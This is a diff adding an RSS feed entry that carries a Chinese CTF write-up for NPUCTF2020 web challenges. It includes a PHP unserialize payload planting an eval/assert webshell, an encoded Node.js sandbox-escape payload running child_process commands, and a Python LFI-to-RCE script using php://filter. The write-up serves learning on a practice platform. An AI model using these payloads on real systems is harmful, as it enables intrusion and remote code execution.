@@ -7482,6 +7482,269 @@ echo $str_show;
 </description>
         </item>
         <item>
+        <title>NPUCTF2020_wp</title>
+        <link>https://anthem-whisper.github.io/p/npuctf2020_wp/</link>
+        <pubDate>Tue, 21 Apr 2020 00:00:00 +0000</pubDate>
+        
+        <guid>https://anthem-whisper.github.io/p/npuctf2020_wp/</guid>
+        <description>&lt;h3 id=&#34;查源码&#34;&gt;查源码&lt;/h3&gt;
+&lt;p&gt;F12，ctrl+U，没啥好说的&lt;/p&gt;
+&lt;h3 id=&#34;realezphphttpsbuuojcnchallengesnpuctf2020readlezphp&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[NPUCTF2020]ReadlezPHP&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RealEzPHP&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;打开是个黑页，查看源码发现了 &lt;code&gt;./time.php?source&lt;/code&gt; 访问之：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; &amp;lt;?php
+#error_reporting(0);
+class HelloPhp
+{
+    public $a;
+    public $b;
+    public function __construct(){
+        $this-&amp;gt;a = &amp;quot;Y-m-d h:i:s&amp;quot;;
+        $this-&amp;gt;b = &amp;quot;date&amp;quot;;
+    }
+    public function __destruct(){
+        $a = $this-&amp;gt;a;
+        $b = $this-&amp;gt;b;
+        echo $b($a);
+    }
+}
+$c = new HelloPhp;
+
+if(isset($_GET[&#39;source&#39;]))
+{
+    highlight_file(__FILE__);
+    die(0);
+}
+
+@$ppp = unserialize($_GET[&amp;quot;data&amp;quot;]);
+
+
+2020-04-21 07:53:29
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;很简单的一个反序列化，&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+#error_reporting(0);
+class HelloPhp
+{
+    public $a = &#39;1&#39;;//更改为2，3，4，5能读取更多信息
+    public $b = &#39;phpinfo&#39;;
+/*
+    public function __destruct(){
+        $a = $this-&amp;gt;a;
+        $b = $this-&amp;gt;b;
+        echo $b($a);
+    }
+*/
+}
+
+$pop = new HelloPhp;
+echo serialize($pop);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;直接 &lt;code&gt;?data=O:8:&amp;quot;HelloPhp&amp;quot;:2:{s:1:&amp;quot;a&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:1:&amp;quot;b&amp;quot;;s:7:&amp;quot;phpinfo&amp;quot;;}&lt;/code&gt; 就能看到phpinfo页面；&lt;/p&gt;
+&lt;p&gt;好，写后门：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+#error_reporting(0);
+class HelloPhp
+{
+    public $a = &#39;eval($_POST[\&#39;wh1sper\&#39;]);&#39;;
+    public $b = &#39;assert&#39;;
+/*
+    public function __destruct(){
+        $a = $this-&amp;gt;a;
+        $b = $this-&amp;gt;b;
+        echo $b($a);
+    }
+*/
+}
+
+$pop = new HelloPhp;
+echo serialize($pop);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;O:8:&amp;ldquo;HelloPhp&amp;rdquo;:2:{s:1:&amp;ldquo;a&amp;rdquo;;s:24:&amp;ldquo;eval($_POST[&amp;lsquo;wh1sper&amp;rsquo;]);&amp;quot;;s:1:&amp;ldquo;b&amp;rdquo;;s:6:&amp;ldquo;assert&amp;rdquo;;}&lt;/p&gt;
+&lt;p&gt;蚁剑访问 &lt;code&gt;?data=O:8:&amp;quot;HelloPhp&amp;quot;:2:{s:1:&amp;quot;a&amp;quot;;s:24:&amp;quot;eval($_POST[&#39;wh1sper&#39;]);&amp;quot;;s:1:&amp;quot;b&amp;quot;;s:6:&amp;quot;assert&amp;quot;;}&lt;/code&gt; 密码wh1sper就能拿到shell，不过在phpinfo里面可以看到禁用了很多函数，这里可以使用蚁剑的插件绕过：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170223.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;直接美滋滋；&lt;/p&gt;
+&lt;p&gt;不过根目录是假flag，flag就在phpinfo页面。。。。。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170231.png&#34; alt=&#34;img&#34;  /&gt;flag{6b8ca41f-d409-4d39-b62f-5243d2f0d64b}&lt;/p&gt;
+&lt;p&gt;我还去探测内网，真的搞心态。。。&lt;/p&gt;
+&lt;h3 id=&#34;webhttpsbuuojcnchallengesnpuctf2020web&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[NPUCTF2020]web%f0%9f%90%95&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;web🐕&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;考察密码学，详见本站：&lt;a class=&#34;link&#34; href=&#34;http://wh1sper.com/padding-oracle-attackcbc%e5%ad%97%e8%8a%82%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Padding Oracle Attack&amp;amp;CBC字节翻转攻击&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;验证httpsbuuojcnchallengesnpuctf2020验证&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[NPUCTF2020]%e9%aa%8c%e8%af%81%f0%9f%90%8e&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;验证🐎&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;参考：https://guokeya.github.io/post/XxOKeal9U/&lt;/p&gt;
+&lt;p&gt;考点：JS弱类型转换，JS原型链&lt;/p&gt;
+&lt;p&gt;源码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;const express = require(&#39;express&#39;);
+const bodyParser = require(&#39;body-parser&#39;);
+const cookieSession = require(&#39;cookie-session&#39;);
+
+const fs = require(&#39;fs&#39;);
+const crypto = require(&#39;crypto&#39;);
+
+const keys = require(&#39;./key.js&#39;).keys;
+
+function md5(s) {
+  return crypto.createHash(&#39;md5&#39;)
+    .update(s)
+    .digest(&#39;hex&#39;);
+}
+
+function saferEval(str) {
+  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;amp;|^%&amp;lt;&amp;gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#39;&#39;)) {
+    return null;
+  }
+  return eval(str);
+} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个
+
+const template = fs.readFileSync(&#39;./index.html&#39;).toString();
+function render(results) {
+  return template.replace(&#39;{{results}}&#39;, results.join(&#39;&amp;lt;br/&amp;gt;&#39;));
+}
+
+const app = express();
+
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+
+app.use(cookieSession({
+  name: &#39;PHPSESSION&#39;, // 2020.3/WORKER2 嘿嘿，给爪⑧
+  keys
+}));
+
+Object.freeze(Object);
+Object.freeze(Math);
+
+app.post(&#39;/&#39;, function (req, res) {
+  let result = &#39;&#39;;
+  const results = req.session.results || [];
+  const { e, first, second } = req.body;
+  if (first &amp;amp;&amp;amp; second &amp;amp;&amp;amp; first.length === second.length &amp;amp;&amp;amp; first!==second &amp;amp;&amp;amp; md5(first+keys[0]) === md5(second+keys[0])) {
+    if (req.body.e) {
+      try {
+        result = saferEval(req.body.e) || &#39;Wrong Wrong Wrong!!!&#39;;
+      } catch (e) {
+        console.log(e);
+        result = &#39;Wrong Wrong Wrong!!!&#39;;
+      }
+      results.unshift(`${req.body.e}=${result}`);
+    }
+  } else {
+    results.unshift(&#39;Not verified!&#39;);
+  }
+  if (results.length &amp;gt; 13) {
+    results.pop();
+  }
+  req.session.results = results;
+  res.send(render(req.session.results));
+});
+
+// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
+app.get(&#39;/source&#39;, function (req, res) {
+  res.set(&#39;Content-Type&#39;, &#39;text/javascript;charset=utf-8&#39;);
+  res.send(fs.readFileSync(&#39;./index.js&#39;));
+});
+
+app.get(&#39;/&#39;, function (req, res) {
+  res.set(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);
+  req.session.admin = req.session.admin || 0;
+  res.send(render(req.session.results = req.session.results || []))
+});
+
+app.listen(80, &#39;0.0.0.0&#39;, () =&amp;gt; {
+  console.log(&#39;Start listening&#39;)
+});
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第一层45行，&lt;code&gt;first &amp;amp;&amp;amp; second &amp;amp;&amp;amp; first.length === second.length &amp;amp;&amp;amp; first!==second &amp;amp;&amp;amp; md5(first+keys[0]) === md5(second+keys[0])&lt;/code&gt;要求first和second长度相同，值不同，然后经过加盐之后值完全相同，一般这种看到就知道是弱类型，在&lt;a class=&#34;link&#34; href=&#34;http://wh1sper.com/susec_ctf_2020_web0_wp/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;susecctf&lt;/a&gt;上面遇见过，盐是字符串，当拼接的时候，first和second都会被转化为字符串，那么我们可以传入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;first=&#39;1&#39; second=[1]
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是urlencode没办法传递数组，第31行恰巧提示了可以接受json形式的数据，那么我们就可以传入json：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Content-Type: application/json
+{&amp;quot;e&amp;quot;:&amp;quot;1+1&amp;quot;,&amp;quot;first&amp;quot;:&amp;quot;1&amp;quot;,&amp;quot;second&amp;quot;:[1]}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们可以看到1+1被执行了；&lt;/p&gt;
+&lt;p&gt;第二层，17行， &lt;code&gt;if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;amp;|^%&amp;lt;&amp;gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#39;&#39;))&lt;/code&gt; 这句话意思大概是，e的值只能 是 &lt;code&gt;Math.xxxxx&lt;/code&gt; 。符号只能出现 &lt;code&gt;()+\-*&amp;amp;|%^&amp;lt;&amp;gt;=,?:&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;由于=&amp;gt;的存在，我们得以使用JS的箭头函数，大概是这个意思：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;x =&amp;gt; x*x
+等价于
+function (x){
+  return x*x;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们对照着playload一步步看：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(Math=&amp;gt;
+(Math=Math.constructor,
+Math.x=Math.constructor(
+Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,
+99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,
+46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,
+95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,
+121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()
+)
+)(Math+1)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最外层的是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(Math=&amp;gt;(xxxxx)())(Math+1)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最外面的小括号是JS立即执行的函数，否则你就只是单单定义了&lt;code&gt;function (Math){}&lt;/code&gt;这个函数。&lt;/p&gt;
+&lt;p&gt;开头的&lt;code&gt;Math&lt;/code&gt;是函数接受的参数也就是形参，&lt;code&gt;xxxxx&lt;/code&gt;是函数体，&lt;code&gt;(Math+1)&lt;/code&gt;是实际传入的参数&lt;/p&gt;
+&lt;p&gt;接下来我们看他的函数体&lt;code&gt;xxxxx&lt;/code&gt;干了些什么；&lt;/p&gt;
+&lt;p&gt;举个例子：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到，这里定义了Math，把传入的Math的&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/zengyonglan/article/details/53465505&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;constructor属性&lt;/a&gt;赋值&lt;/p&gt;
+&lt;p&gt;具体是什么意思呢？这里是利用了JS的原型链：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;一开始&lt;code&gt;Math&lt;/code&gt;并没有定义，如果我们直接传入&lt;code&gt;Match&lt;/code&gt;，那么会是&lt;code&gt;object&lt;/code&gt;，而payload中传入的是&lt;code&gt;Math+1&lt;/code&gt;，此时类型就变成了&lt;code&gt;object1&lt;/code&gt;。object对象和字符串进行拼接。那么会转换为&lt;code&gt;string&lt;/code&gt;类型&lt;/li&gt;
+&lt;li&gt;为了清楚，我们重写下代码：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;test=Math.constructor //传入的Math是string，返回string类型的原型，String[function String()]
+test2=test.constructor //返回string原型的原型，Function[funciton Function]
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;也就是通过一个 &lt;code&gt;object1&lt;/code&gt; 从原型链上获取了&lt;code&gt;String&lt;/code&gt;和&lt;code&gt;Function&lt;/code&gt;两种类型&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;回到题目，&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#fromCharCode函数必须是在String类型上用，也就是String.fromCharCode()
+Math=Math.constructor
+  #定义了string类型
+Math=Math.construtor
+  #定义了function类型
+Math.constructor,Math=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))()
+等同于
+function(string.fromCharCode(xxxxxxxxx)()
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;exp中fromCharCode里面解码是：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString()
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;相当于我们执行了：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;function(
+return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString()
+)()
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag{7683e76d-e61e-4b5a-bca0-3ad38bfa27a0}&lt;/p&gt;
+&lt;h3 id=&#34;ezincludehttpsbuuojcnchallengesnpuctf2020ezinclude&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[NPUCTF2020]ezinclude&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ezinclude&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;考点：MD5哈希长度拓展攻击（疑似）、PHP7利用php Segfault包含保存的临时文件&lt;/p&gt;
+&lt;p&gt;打开题目，源代码里面有提示：&lt;code&gt;&amp;lt;!--md5($secret.$name)===$pass --&amp;gt;&lt;/code&gt; 疑似&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/2563&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;MD5哈希长度拓展攻击&lt;/a&gt;，不过在响应包里面给出啦pass的值，可能是出题出翻车了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170244.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;得到了 &lt;code&gt;flflflflag.php&lt;/code&gt; ，访问重定向到了其他页面，抓包抓回来，页面提示 &lt;code&gt;include($_GET[&amp;quot;file&amp;quot;])&lt;/code&gt; ，扫目录可以得到 &lt;code&gt;dir.php&lt;/code&gt; ,包含他可以看到这个页面列出了 &lt;code&gt;/tmp&lt;/code&gt; 下的所有文件&lt;/p&gt;
+&lt;p&gt;这里考察的是PHP临时文件包含，其基本是两种情况：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;利用能访问的phpinfo页面，对其一次发送大量数据造成临时文件没有及时被删除&lt;/li&gt;
+&lt;li&gt;PHP版本&amp;lt;7.2，利用php崩溃留下临时文件&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;贴一篇：&lt;a class=&#34;link&#34; href=&#34;https://bbs.zkaq.cn/t/3639.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&amp;raquo;LFIroRCE总结&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/62958418&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&amp;raquo;文件包含&amp;amp;奇技淫巧&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;这里就不累述了，直接上脚本：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+from io import BytesIO
+
+payload = &amp;quot;&amp;lt;?php phpinfo()?&amp;gt;&amp;quot;
+file_data = {
+    &#39;file&#39;: BytesIO(payload.encode())
+}
+url = &amp;quot;http://35869f0e-43e6-47db-a026-b77fdfed3fea.node3.buuoj.cn/flflflflag.php?&amp;quot;\
+      +&amp;quot;file=php://filter/string.strip_tags/resource=/etc/passwd&amp;quot;
+r = requests.post(url=url, files=file_data, allow_redirects=False)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后访问 &lt;code&gt;dir.php&lt;/code&gt; 可以得到临时文件的名称，包含之即可RCE&lt;/p&gt;
+&lt;p&gt;flag就在phpinfo页面&lt;/p&gt;
+&lt;p&gt;flag{2ac28208-c35f-426b-bca5-4f50a77e1203}&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Padding Oracle Attack&amp;CBC字节翻转攻击</title>
         <link>https://anthem-whisper.github.io/p/padding-oracle-attackcbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</link>
         <pubDate>Tue, 21 Apr 2020 00:00:00 +0000</pubDate>
